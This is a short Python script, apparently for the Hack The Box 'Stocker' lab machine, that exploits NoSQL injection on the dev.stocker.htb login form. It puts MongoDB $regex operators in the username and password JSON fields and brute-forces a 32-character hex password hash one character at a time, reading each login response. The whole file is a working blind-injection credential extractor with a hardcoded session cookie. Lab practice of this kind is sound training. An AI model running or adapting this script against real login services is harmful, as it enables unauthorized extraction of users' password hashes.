#!/bin/python3

import requests


# generated with burp and https://www.scrapingbee.com/curl-converter/python/

cookies = {
    'connect.sid': 's%3AS4pgwgljU11SRw_o5_aGe_SiY8CCn426.2qsOexOSN0qUlge9ZB%2FvGjLz8GLRhWAHpHDMultZ0JQ',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'connect.sid=s%3AS4pgwgljU11SRw_o5_aGe_SiY8CCn426.2qsOexOSN0qUlge9ZB%2FvGjLz8GLRhWAHpHDMultZ0JQ',
    'Origin': 'http://dev.stocker.htb',
    'Referer': 'http://dev.stocker.htb/login',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
}


json_data = {
    'username': {
        '$regex': 'angoose',
    },
    'password': {
        '$regex': '................................',
    },
}

passwordLength = 32

currentPassword = '.'*passwordLength

i = 0

doneWithChar = False

while i < passwordLength:
	currentPassword = list(currentPassword)
	for letter in 'abcdef0123456789': # 32 characters indicates that this may be a hash
		currentPassword[i] = letter

		passwordString = "".join(currentPassword)
		json_data['password']['$regex'] = passwordString
		print(f'Trying password: {passwordString}')


		response = requests.post('http://dev.stocker.htb/login', cookies=cookies, headers=headers, json=json_data, verify=False)
		ans = response.history[0].text
		print(ans)
		if('error' not in ans):
			currentPassword = passwordString
			i += 1
			break